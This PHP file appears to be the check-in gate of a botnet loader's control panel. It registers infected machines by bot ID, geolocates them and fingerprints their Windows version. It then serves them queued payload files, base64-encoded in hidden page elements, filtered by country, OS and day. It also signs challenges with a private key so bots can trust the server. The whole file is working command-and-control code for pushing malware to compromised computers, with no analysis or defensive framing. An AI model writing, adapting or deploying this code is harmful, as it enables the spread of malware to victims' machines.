<?php
ob_start();
define('CP', TRUE);
error_reporting(E_ALL);
set_time_limit(0);
ini_set("session.gc_maxlifetime", 180);
ini_set("session.gc_divisor", 1);
ini_set("session.gc_probability", 1);
session_save_path(__DIR__."/tmp");


$cmd = '';
$total_sessions = count(scandir(ini_get("session.save_path")));
if($total_sessions > 12)
	Sleep($total_sessions * 1);
if(!is_readable(__DIR__.'/core/config.php'))
	goto flushcmd;

session_start();

include __DIR__.'/core/privatekey.php';
include __DIR__.'/core/geoip/geoipcity.php';
include __DIR__.'/core/config.php';  
$binary_signature = "";

if(isset($_GET['k'])){
	openssl_sign($_GET['k'], $binary_signature, $private_key, OPENSSL_ALGO_SHA1);
	$cmd .= "<div id=\"s\">".base64_encode(strrev($binary_signature))."</div>";
}

  

		$useragent = $_SERVER['HTTP_USER_AGENT'];
		$version = 0;
		$wow64 = substr_count($useragent, 'WOW64') >= 1 ? 1 : 0;

		if(preg_match('/windows nt 10.0/i', $useragent))
			$version = 5;
		else if(preg_match('/windows nt 6.2/i', $useragent) || preg_match('/windows nt 6.3/i', $useragent))
			$version = 4;
		else if (preg_match('/windows nt 6.1/i', $useragent)) 
			$version = 3;
		else if (preg_match('/windows nt 6.0/i', $useragent))
			$version = 2;
		else if (preg_match('/windows nt 5.2/i', $useragent) || preg_match('/windows nt 5.0/i', $useragent) || preg_match('/windows nt 5.1/i', $useragent))
			$version = 1;
		
		
		$database = new mysqli($MYSQL_HOST, $MYSQL_LOGIN, $MYSQL_PASSWORD, $MYSQL_DB);
		if(mysqli_connect_error())
			goto flushcmd;

		$gi = geoip_open(__DIR__.'/core/geoip/GeoLiteCity.dat', GEOIP_STANDARD);
		$ip = getIP();

		$record = geoip_record_by_addr($gi, $ip);
		$time = time();
		$cc = NULL;
		if(empty($record->country_code))$cc = "XX";
		else $cc = $record->country_code;

		$ipforbd = ip2long($ip);
	
		 
		if(!empty($_GET['g']))
			$botuid = mysqli_real_escape_string($database, htmlspecialchars($_GET['g']));
		else goto flushcmd;
		
		$sql = 'SELECT * FROM `task` WHERE `active` = "1" AND (`need` > `complete` OR `need`=0)';
		$result = mysqli_query($database, $sql);

  		$task_id = array();
		$task_filehash = array();
		$task_newonly = array();
		$count_tasks = 0;
		
		if($result == FALSE||mysqli_num_rows($result) > 0){
			
				while($row = mysqli_fetch_array($result))
				{
					if(strcmp($row['country'], "ALL") !== 0){
						if(strstr($row['country'], $cc) == FALSE)
							continue;
					}
					if(strcmp($row['os'], "1,2,3,4,5") !== 0){
						if(strstr($row['os'], $version) == FALSE)
							continue;
					}
					if(strcmp($row['days'], "1,2,3,4,5,6,7") !== 0){
						if(strstr($row['days'], date("N")) == FALSE)
							continue;
					}
					
					array_push($task_filehash, $row['filehash']);
					array_push($task_id, $row['id']);
					array_push($task_newonly, $row['onlynewbots']);
					$count_tasks++;
	
				}
				
					$sql = "SELECT * FROM `bots` WHERE `botuid`='{$botuid}'";
					$result = mysqli_query($database, $sql);
					if($result == FALSE || mysqli_num_rows($result) == 0){
						// unknown bot 
						$taskcomplete = implode(",", $task_id).",";
						$sql = "INSERT INTO `bots` (`id`, `botuid`, `ip`, `cc`, `timeAdd`, `timeLast`, `os`, `wow64`, `taskcomplete`) VALUES (NULL, '{$botuid}', '{$ipforbd}', '{$cc}', '{$time}', '{$time}', '{$version}', '{$wow64}', '{$taskcomplete}');";
						mysqli_query($database, $sql);
						goto beforeflush;
					}
			
						
					$botinfo = mysqli_fetch_array($result);
					
					if(isset($botinfo['taskcomplete']))
					{
						$tasksarraylen = count($task_id);
						for($i = 0;$i < $tasksarraylen; $i++)
							if(strstr($botinfo['taskcomplete'], $task_id[$i]) !== FALSE){
								unset($task_id[$i]);
								unset($task_filehash[$i]);
								$count_tasks--;
							}
						$task_id = array_values($task_id);
						$task_filehash = array_values($task_filehash);
					}
					
					$taskcomplete = $botinfo['taskcomplete'];
					
						if($count_tasks != 0)
						{
								$taskcomplete .= ",".implode(",", $task_id);		
				
							$sql = "UPDATE `bots` SET `taskcomplete` = '{$taskcomplete}' WHERE `botuid`= '{$botuid}';";
							mysqli_query($database, $sql);
						}
				
					
				
				beforeflush:
				for($i = 0; $i < $count_tasks; $i++){
					if(isset($task_filehash[$i])){
						$filedata = @file_get_contents("files/{$task_filehash[$i]}");
						if($filedata != NULL){
							$sql = "UPDATE `task` SET `complete` = `complete` + 1 WHERE `id` = '{$task_id[$i]}';";
							mysqli_query($database, $sql);
							$cmd .= '<div style="display:none" id="download" name="download">'.base64_encode($filedata).'</div>';
						}
					}

				}
		}else{
			$sql = "INSERT IGNORE INTO `bots` (`id`, `botuid`, `ip`, `cc`, `timeAdd`, `timeLast`, `os`, `wow64`, `taskcomplete`) VALUES (NULL, '{$botuid}', '{$ipforbd}', '{$cc}', '{$time}', '{$time}', '{$version}', '{$wow64}', NULL);";
			mysqli_query($database, $sql);
		
			goto beforeflush;
		}

		mysqli_close($database);
		

		touch(__DIR__.'/core/cp.lock');
		clearstatcache();

		geoip_close($gi);
	
function generateRandomString($length = 10) {

    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function getIP()
{
	if (isset($_SERVER["HTTP_X_REAL_IP"]))
		return $_SERVER["HTTP_X_REAL_IP"];
	else if (isset($_SERVER["HTTP_X_FORWARDED_FOR"]))
		return $_SERVER ["HTTP_X_FORWARDED_FOR"];
	return $_SERVER['REMOTE_ADDR'];
}


flushcmd:

echo $cmd;
ob_end_flush();

session_unset();
session_destroy();
session_write_close();
?>
